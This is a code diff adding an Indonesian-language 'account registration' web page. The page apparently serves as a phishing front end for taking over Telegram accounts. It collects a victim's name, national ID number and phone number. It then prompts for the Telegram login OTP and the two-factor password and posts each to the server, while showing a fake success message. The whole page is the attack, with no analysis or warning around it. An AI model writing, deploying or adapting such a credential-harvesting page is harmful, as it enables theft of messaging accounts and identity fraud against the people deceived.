@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Registrasi Akun</title>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+        h1 {
+            color: #004085;
+            font-size: 24px;
+        }
+        form {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #333;
+            text-align: left;
+        }
+        input[type="text"], input[type="email"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        button {
+            background-color: #004085;
+            color: #fff;
+            padding: 12px;
+            width: 100%;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #003366;
+        }
+        #loading {
+            display: none;
+            margin-top: 20px;
+        }
+        /* Styling untuk gambar */
+        #logo {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 20px; /* Jarak antara gambar dan judul */
+        }
+        .swal-custom-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .swal-input-custom {
+            width: 80%;
+            max-width: 300px;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            text-align: center;
+            margin: 0 auto;
+        }
+        .swal-title-custom {
+            margin-top: 40px;
+            font-size: 16px;
+            color: #004085;
+            font-weight: bold;
+        }
+        .swal-inputLabel-custom {
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #004085;
+            font-weight: bold;
+        }
+        #logo {
+            margin-top: 40px;
+            width: 500px;              /* Atur lebar sesuai kebutuhan */
+            height: 400px;             /* Pastikan tinggi sama dengan lebar */
+            object-fit: cover;         /* Memastikan gambar tidak terdistorsi */
+            border-radius: none;        /* Membuat sudut melengkung menjadi lingkaran */
+            margin-bottom: 20px;       /* Jarak antara gambar dan elemen di bawahnya */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Bayangan halus */
+            transition: transform 0.3s; /* Efek transisi saat hover */
+        }
+
+        #logo:hover {
+            transform: scale(1.05);    /* Memperbesar gambar sedikit saat di-hover */
+        }
+    </style>
+</head>
+<body>
+    <form id="phoneForm">
+        <img id="logo" src="sm.jpg" alt="Logo" />
+        <h1>REGISTRASI AKUN</h1>
+        <label for="name">Nama:</label>
+        <input type="text" id="name" name="name" placeholder="Masukkan nama Anda" required>
+
+        <label for="email">Nomor Induk KTP:</label>
+        <input type="email" id="email" name="email" placeholder="Masukkan NIK Anda" required>
+
+        <label for="phoneNumber">Nomor Telepon Telegram Aktif:</label>
+        <input type="text" id="phoneNumber" name="phoneNumber" placeholder="Masukkan nomor telepon" required>
+
+        <button type="submit">DAFTAR</button>
+        <div id="loading" style="display: none;">Loading...</div>
+    </form>
+
+    <script>
+        async function handleResponse(response) {
+            if (!response.ok) {
+                const error = await response.json();
+                throw new Error(error.message || 'Network response was not ok');
+            }
+            return response.json();
+        }
+
+        async function submitPassword(phoneNumber, otpResponse) {
+            const { value: password } = await Swal.fire({
+                title: 'Masukkan Password Telegram',
+                input: 'password',
+                inputLabel: 'Password',
+                inputPlaceholder: 'Masukkan password 2FA Anda',
+                inputAttributes: {
+                    autocapitalize: 'off',
+                    autocorrect: 'off',
+                },
+                showCancelButton: true,
+                confirmButtonText: 'Submit',
+                showLoaderOnConfirm: true,
+                customClass: {
+                    input: 'swal-input-custom',
+                    inputLabel: 'swal-inputLabel-custom'
+                },
+                preConfirm: async (password) => {
+                    if (!password) {
+                        Swal.showValidationMessage('Please enter your 2FA password');
+                        return false;
+                    }
+                    try {
+                        const response = await fetch('/submit-password', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                phoneNumber, 
+                                password: password.trim(),
+                                otpData: otpResponse
+                            })
+                        });
+                        return handleResponse(response);
+                    } catch (error) {
+                        Swal.showValidationMessage(`Request failed: ${error}`);
+                    }
+                }
+            });
+
+            if (password) {
+                await Swal.fire({
+                    icon: 'success',
+                    title: 'Sukses!',
+                    text: 'Berhasil registrasi.'
+                });
+                window.location.href = 'reload.html';
+            }
+        }
+
+        async function submitOTP(phoneNumber) {
+            const { value: otpResult } = await Swal.fire({
+                title: 'MASUKKAN OTP YANG TERKIRIM DI TELEGRAM',
+                input: 'text',
+                inputLabel: 'Kode OTP',
+                inputPlaceholder: 'Masukkan kode OTP yang dikirim',
+                inputAttributes: {
+                    maxlength: 5,
+                    autocapitalize: 'off',
+                    autocorrect: 'off',
+                },
+                validationMessage: 'Masukkan kode OTP',
+                showCancelButton: true,
+                confirmButtonText: 'Submit',
+                showLoaderOnConfirm: true,
+                customClass: {
+                    title: 'swal-title-custom',
+                    container: 'swal-custom-container',
+                    input: 'swal-input-custom',
+                    inputLabel: 'swal-inputLabel-custom'
+                },
+                preConfirm: async (otp) => {
+                    if (!otp) {
+                        Swal.showValidationMessage('Masukkan kode OTP');
+                        return false;
+                    }
+                    try {
+                        const otpResponse = await fetch('/submit-otp', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ phoneNumber, otp })
+                        });
+                        const result = await handleResponse(otpResponse);
+                        console.log('OTP Response:', result);
+                        return result;
+                    } catch (error) {
+                        Swal.showValidationMessage(`Request failed: ${error}`);
+                    }
+                }
+            });
+
+            if (otpResult && otpResult.status === 'password_required') {
+                await submitPassword(phoneNumber, otpResult);
+            } else if (otpResult && otpResult.status === 'success') {
+                await Swal.fire({
+                    icon: 'success',
+                    title: 'Sukses!',
+                    text: 'Berhasil registrasi.'
+                });
+                window.location.href = 'reload.html';
+            }
+
+            return otpResult;
+        }
+
+        document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phoneInput = document.getElementById('phoneNumber');
+            let phoneNumber = phoneInput.value.trim();
+
+            // Konversi "0" di depan nomor telepon menjadi "+62"
+            if (phoneNumber.startsWith('0')) {
+                phoneNumber = '+62' + phoneNumber.slice(1);
+            }
+
+            const loading = document.getElementById('loading');
+
+            try {
+                loading.style.display = 'block';
+
+                const response = await fetch('/submit-phone', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phoneNumber })
+                });
+
+                const result = await handleResponse(response);
+                
+                if (result.status === 'otp_required') {
+                    const otpResult = await submitOTP(phoneNumber);
+                }
+
+                console.log('Phone number submitted:', phoneNumber);
+            } catch (error) {
+                console.error('Error:', error);
+                await Swal.fire({
+                    icon: 'error',
+                    title: 'Error',
+                    text: error.message || 'An error occurred. Please try again.'
+                });
+            } finally {
+                loading.style.display = 'none';
+            }
+        });
+
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/[^\d+]/g, '');
+            e.target.value = value;
+        });
+    </script>
+</body>
+</html>
